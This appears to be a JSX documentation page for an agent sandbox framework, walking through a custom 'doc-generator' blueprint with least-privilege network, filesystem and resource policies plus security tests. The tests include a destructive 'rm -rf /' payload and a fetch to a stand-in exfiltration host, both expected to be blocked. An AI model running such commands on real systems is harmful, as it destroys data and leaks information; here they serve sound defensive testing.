import { CodeBlock, NoteBlock, StepBlock, WarningBlock, ExerciseBlock } from '../../../components/content'

export default function CreatingBlueprints() {
  return (
    <div className="space-y-6">
      <h1 className="text-3xl font-bold text-gray-900 dark:text-white">
        Creating Custom Blueprints
      </h1>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        NemoClaw's built-in blueprints cover common agent patterns, but real-world deployments
        often require custom configurations tailored to specific use cases, security
        requirements, and organizational policies. Creating a custom blueprint gives you full
        control over every aspect of the agent's environment: what it can access, how it
        behaves, and how it is secured. This section walks through the process from initial
        scaffolding to testing and iteration.
      </p>

      <h2 className="text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8">
        Starting from Scratch vs. Forking
      </h2>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        You have two paths to creating a custom blueprint: starting from an empty scaffold
        or forking an existing blueprint. Forking is usually faster because you start with a
        working configuration and modify it, rather than building up from nothing. Starting
        from scratch gives you a cleaner result with no inherited assumptions, which is better
        when your use case is significantly different from any existing blueprint.
      </p>

      <CodeBlock
        language="bash"
        title="Two approaches to creating a blueprint"
      >{`# Approach 1: Scaffold a new empty blueprint
nemoclaw blueprint init my-agent
# Creates my-agent/ with a minimal blueprint.yaml and directory structure

# Approach 2: Fork an existing blueprint
nemoclaw blueprint fork coding-agent my-custom-agent
# Creates my-custom-agent/ as a copy of the coding-agent blueprint
# with metadata updated (name, version reset to 0.1.0)`}</CodeBlock>

      <h2 className="text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8">
        Step-by-Step: Building a Blueprint from Scratch
      </h2>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        Let us build a blueprint for a "documentation agent" that reads source code and
        generates documentation. This agent needs read-only access to a project directory,
        write access to a docs output directory, and network access to an LLM endpoint.
      </p>

      <StepBlock number={1} title="Initialize the blueprint directory">
        <CodeBlock language="bash">{`nemoclaw blueprint init doc-generator
cd doc-generator

# Resulting structure:
# doc-generator/
# ├── blueprint.yaml
# ├── policies/
# └── scripts/`}</CodeBlock>
      </StepBlock>

      <StepBlock number={2} title="Define the blueprint manifest">
        <CodeBlock language="yaml" title="blueprint.yaml">{`name: "doc-generator"
version: "0.1.0"
description: "Reads source code and generates documentation"
author: "your-name"

llm:
  provider: "openai-compatible"
  base_url_env: "LLM_BASE_URL"
  model_env: "LLM_MODEL"
  api_key_env: "LLM_API_KEY"
  timeout: 60

agent:
  system_prompt_file: "system-prompt.md"
  max_turns: 100
  max_tool_calls_per_turn: 5

tools:
  builtin:
    - shell
    - file_read
    - file_write

policies:
  network:
    file: "policies/network.yaml"
  filesystem:
    file: "policies/filesystem.yaml"
  resources:
    file: "policies/resources.yaml"

init:
  environment:
    OUTPUT_DIR: "/workspace/docs"
  scripts:
    - "scripts/init.sh"`}</CodeBlock>
      </StepBlock>

      <StepBlock number={3} title="Write the system prompt">
        <CodeBlock language="markdown" title="system-prompt.md">{`You are a documentation generator agent. Your job is to read source code
files and produce clear, comprehensive documentation.

## Rules
- Read source files from /workspace/src (read-only)
- Write documentation output to /workspace/docs
- Generate Markdown files for each module/class/function
- Include code examples extracted from the source
- Do not modify any source files
- Do not access the internet except for LLM inference
- Do not execute any source code

## Output Format
For each source file, create a corresponding .md file in the output
directory with:
1. Module overview
2. Public API documentation
3. Usage examples
4. Type signatures where applicable`}</CodeBlock>
      </StepBlock>

      <StepBlock number={4} title="Define the network policy">
        <CodeBlock language="yaml" title="policies/network.yaml">{`# Network policy: only allow LLM endpoint
default: deny

allow:
  - group: "llm"
    description: "LLM inference endpoint"
    rules:
      # Allow the configured LLM endpoint
      # The actual host is resolved from the blueprint's llm.base_url
      - host: "integrate.api.nvidia.com"
        port: 443
        tls: required

# For local inference, replace with:
# - host: "localhost"
#   port: 8000`}</CodeBlock>
      </StepBlock>

      <StepBlock number={5} title="Define the filesystem policy">
        <CodeBlock language="yaml" title="policies/filesystem.yaml">{`# Filesystem policy: read source, write docs
default: deny

rules:
  # Read-only access to source code
  - path: "/workspace/src"
    access: read
    recursive: true

  # Read-write access to documentation output
  - path: "/workspace/docs"
    access: read-write
    recursive: true

  # Read access to common system files needed by tools
  - path: "/usr/lib"
    access: read
    recursive: true
  - path: "/usr/bin"
    access: read
    recursive: true

  # Temp directory for tool operations
  - path: "/tmp"
    access: read-write
    recursive: true`}</CodeBlock>
      </StepBlock>

      <StepBlock number={6} title="Define resource limits">
        <CodeBlock language="yaml" title="policies/resources.yaml">{`# Resource limits for the doc-generator agent
cpu:
  shares: 1024          # relative CPU weight
  max_cores: 2          # maximum CPU cores

memory:
  max_mb: 2048          # 2 GB maximum memory
  swap_mb: 512          # 512 MB swap

storage:
  max_mb: 1024          # 1 GB maximum disk usage in sandbox

processes:
  max_pids: 64          # maximum concurrent processes

time:
  max_runtime_minutes: 30  # kill agent after 30 minutes`}</CodeBlock>
      </StepBlock>

      <StepBlock number={7} title="Create the initialization script">
        <CodeBlock language="bash" title="scripts/init.sh">{`#!/bin/bash
# Initialization script for doc-generator blueprint

# Ensure output directory exists
mkdir -p /workspace/docs

# Verify source directory is accessible
if [ ! -d "/workspace/src" ]; then
  echo "ERROR: /workspace/src does not exist or is not mounted"
  exit 1
fi

echo "Doc-generator initialized. Source: /workspace/src, Output: /workspace/docs"
echo "Files to document: $(find /workspace/src -name '*.py' -o -name '*.js' -o -name '*.ts' | wc -l)"
`}</CodeBlock>
      </StepBlock>

      <h2 className="text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8">
        Testing Your Blueprint
      </h2>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        Before deploying a blueprint, you should validate its configuration and test it with
        realistic inputs. NemoClaw provides several tools for this purpose.
      </p>

      <CodeBlock
        language="bash"
        title="Blueprint testing workflow"
      >{`# Step 1: Validate the blueprint configuration
nemoclaw blueprint validate ./doc-generator/
# Checks YAML syntax, schema compliance, file references, and policy consistency

# Step 2: Dry-run the blueprint (loads everything, does not start the agent)
nemoclaw run --blueprint ./doc-generator/ --dry-run
# Shows the fully resolved configuration, including defaults

# Step 3: Run with a test project
nemoclaw run --blueprint ./doc-generator/ \\
  --mount ./sample-project:/workspace/src:ro \\
  --mount ./test-output:/workspace/docs:rw \\
  --prompt "Document all Python files in /workspace/src"

# Step 4: Inspect the output
ls ./test-output/
cat ./test-output/*.md`}</CodeBlock>

      <NoteBlock type="info" title="Iterative Development Workflow">
        <p>
          Blueprint development is iterative. Start with the most restrictive policies possible,
          run the agent, observe what gets blocked in the TUI, and then selectively open up
          access. This approach follows the principle of least privilege and ensures you
          understand exactly what the agent needs. Common iteration patterns include: adding
          network endpoints the agent tries to reach, expanding filesystem paths the agent needs
          to read, and adjusting resource limits when the agent runs out of memory or time.
        </p>
      </NoteBlock>

      <h2 className="text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8">
        Writing Blueprint Tests
      </h2>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        NemoClaw supports declarative test cases for blueprints. These tests verify that the
        blueprint's policies behave as expected and can be run in CI/CD pipelines.
      </p>

      <CodeBlock
        language="yaml"
        title="tests/test-security.yaml"
      >{`# Security tests for doc-generator blueprint
name: "doc-generator security tests"

tests:
  - name: "cannot write to source directory"
    action:
      tool: file_write
      args:
        path: "/workspace/src/malicious.py"
        content: "import os; os.system('rm -rf /')"
    expect:
      result: blocked
      reason: "filesystem policy denies write to /workspace/src"

  - name: "cannot access internet"
    action:
      tool: web_fetch
      args:
        url: "https://evil-server.example.com/exfiltrate"
    expect:
      result: blocked
      reason: "network policy denies connection to evil-server.example.com"

  - name: "can read source files"
    action:
      tool: file_read
      args:
        path: "/workspace/src/main.py"
    expect:
      result: allowed

  - name: "can write to docs directory"
    action:
      tool: file_write
      args:
        path: "/workspace/docs/main.md"
        content: "# Main Module Documentation"
    expect:
      result: allowed`}</CodeBlock>

      <CodeBlock
        language="bash"
        title="Running blueprint tests"
      >{`# Run all tests for a blueprint
nemoclaw blueprint test ./doc-generator/

# Run a specific test file
nemoclaw blueprint test ./doc-generator/ --file tests/test-security.yaml

# Run tests with verbose output
nemoclaw blueprint test ./doc-generator/ --verbose`}</CodeBlock>

      <WarningBlock title="Test with Real Policies">
        <p>
          Blueprint tests execute within an actual sandbox with the blueprint's policies applied.
          They are not mocked. This means they test the real behavior of your Landlock filesystem
          rules, network namespace policies, and seccomp filters. If a test says a write is
          blocked, it is genuinely blocked by the kernel -- not by a simulated policy layer.
          This gives you high confidence that the policies will behave the same in production.
        </p>
      </WarningBlock>

      <ExerciseBlock
        title="Create a Custom Blueprint"
        difficulty="advanced"
      >
        <ol className="list-decimal list-inside space-y-2 mt-2">
          <li>Choose a specific agent use case (e.g., log analyzer, test runner, dependency auditor).</li>
          <li>Scaffold a new blueprint with nemoclaw blueprint init.</li>
          <li>Define the minimal set of network endpoints the agent needs.</li>
          <li>Define the filesystem paths with appropriate read/write permissions.</li>
          <li>Write a system prompt that instructs the agent on its task and boundaries.</li>
          <li>Write at least three security test cases verifying that the agent cannot exceed its permissions.</li>
          <li>Run the blueprint against a real project and iterate on the policies.</li>
        </ol>
      </ExerciseBlock>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        With your blueprint created and tested, the next step is understanding how to version it
        properly and distribute it to others. The next section covers semantic versioning for
        blueprints, distribution channels, and the trust model for shared blueprints.
      </p>
    </div>
  )
}
